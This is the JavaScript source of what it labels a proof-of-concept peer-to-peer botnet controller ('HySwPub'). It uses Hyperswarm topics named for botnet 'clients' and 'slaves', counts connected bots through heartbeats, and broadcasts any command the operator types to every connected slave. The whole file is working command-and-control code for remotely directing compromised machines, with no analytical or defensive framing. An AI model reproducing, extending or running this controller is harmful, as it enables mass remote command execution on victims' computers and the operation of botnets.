const Hyperswarm = require('hyperswarm');
const crypto = require('crypto');
const readline = require('readline');
const chalk = require('chalk');
process.title = 'HySwPub | 0 clients | 0 slaves';

const swarm = new Hyperswarm();
const CLIENTS_TOPIC = 'hyperswarm_public_botnet_clients';
const SLAVES_TOPIC = 'hyperswarm_public_botnet_slaves';

const clientsTopicKey = crypto.createHash('sha256').update(CLIENTS_TOPIC).digest();
const slavesTopicKey = crypto.createHash('sha256').update(SLAVES_TOPIC).digest();

const state = {
    clientCount: 0,
    slaveCount: 0,
    connections: new Set(),
    clientConnections: new Set(),
    slaveConnections: new Set()
};

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: '$ '
});

function log(color = chalk.reset, prefix = "INFO", message = "(no comment)") {
    const d = new Date();
    const timestamp = d.toTimeString().split(' ')[0] + '.' + d.getMilliseconds().toString().padStart(3, '0');
    console.log(`[${timestamp}] ${color(prefix+':')} ${message}`);
}

function updateTitle() {
    process.title = `HySwPub | ${state.clientCount} clients | ${state.slaveCount} slaves`;
}

function sendHeartbeat(type) {
    const connections = type === 'clients' ? state.clientConnections : state.slaveConnections;
    const message = JSON.stringify({
        type: 'heartbeat',
        source: 'client',
        timestamp: Date.now()
    });
    
    connections.forEach(connection => {
        try {
            connection.write(message);
        } catch (error) { }
    });
}

function setupHeartbeat() {
    setInterval(() => {
        sendHeartbeat('clients');
        sendHeartbeat('slaves');
        
        state.clientCount = 0;
        state.slaveCount = 0;
        
        setTimeout(updateTitle, 1000);
    }, 5000);
}

function handleConnection(socket, info, type) {
    state.connections.add(socket);
    if (type === 'client') {
        state.clientConnections.add(socket);
    } else {
        state.slaveConnections.add(socket);
    }
    
    socket.write(JSON.stringify({
        type: 'heartbeat_response',
        source: 'client',
        timestamp: Date.now()
    }));
    
    socket.on('close', () => {
        state.connections.delete(socket);
        if (type === 'client') {
            state.clientConnections.delete(socket);
        } else {
            state.slaveConnections.delete(socket);
        }
        updateTitle();
    });
    
    socket.on('error', (err) => { });

    socket.on('data', (data) => {
        try {
            const message = JSON.parse(data.toString());
            
            if (message.type === 'heartbeat_response') {
                if (message.source === 'client') {
                    state.clientCount++;
                } else if (message.source === 'slave') {
                    state.slaveCount++;
                }
                updateTitle();
            }
            
            if (message.type === 'heartbeat') {
                socket.write(JSON.stringify({
                    type: 'heartbeat_response',
                    source: 'client',
                    timestamp: Date.now()
                }));
            }
        } catch (error) { }
    });
}

swarm.on('connection', (socket, info) => {
    const peerTopicHex = info.topics?.[0]?.toString('hex');
    const isClientConnection = peerTopicHex === clientsTopicKey.toString('hex');
    const connectionType = isClientConnection ? 'client' : 'slave';
    
    handleConnection(socket, info, connectionType);
});

swarm.on('error', (err) => {
    log(chalk.redBright, 'ERROR', `Something went wrong: ${err.message}`);
});

function joinTopics() {
    swarm.join(clientsTopicKey, { server: true, client: true });
    swarm.join(slavesTopicKey, { server: true, client: true });

    /*    ╱|、      
        (˚ˎ 。7     
         |、˜〵     
         じしˍ,)ノ  
    */
   
    log(chalk.cyanBright, 'INFO', 'Connected to the network as client');
    log(chalk.cyanBright, 'INFO', 'Listening for connections...');
}

function init() {
    console.clear();
    console.log(chalk.redBright(`              __           ___       _     \n  /\\  /\\_   _/ _\\_      __/ _ \\_   _| |__  \n / /_/ / | | \\ \\\\ \\ /\\ / / /_)/ | | | '_ \\ \n/ __  /| |_| |\\ \\\\ V  V / ___/| |_| | |_) |\n\\/ /_/  \\__, \\__/ \\_/\\_/\\/     \\__,_|_.__/ \n        |___/ PoC BETA\n`));
    joinTopics();
    setupHeartbeat();
    setTimeout(() => {
        console.log(chalk.green('\nWelcome, user.'));
        rl.prompt();
    }, 1000);
    
    rl.on('line', (line) => {
        const command = line.trim();
        
        if (command) {
            const commandMessage = JSON.stringify({
                type: 'command',
                command: command,
                timestamp: Date.now()
            });
            
            let sentCount = 0;
            state.slaveConnections.forEach(connection => {
                try {
                    connection.write(commandMessage);
                    sentCount++;
                } catch (error) { }
            });
            
            log(chalk.yellowBright, 'BOTS', `Sent to ${sentCount} slaves!`);
        }
        
        rl.prompt();
    });
}

init();

process.on('SIGINT', () => {
    log(chalk.cyanBright, 'INFO', 'Disconnecting...');
    process.exit();
});

process.on('uncaughtException', (err) => {
    log(chalk.redBright, 'ERROR', `Something went wrong: ${err.message}`);
});
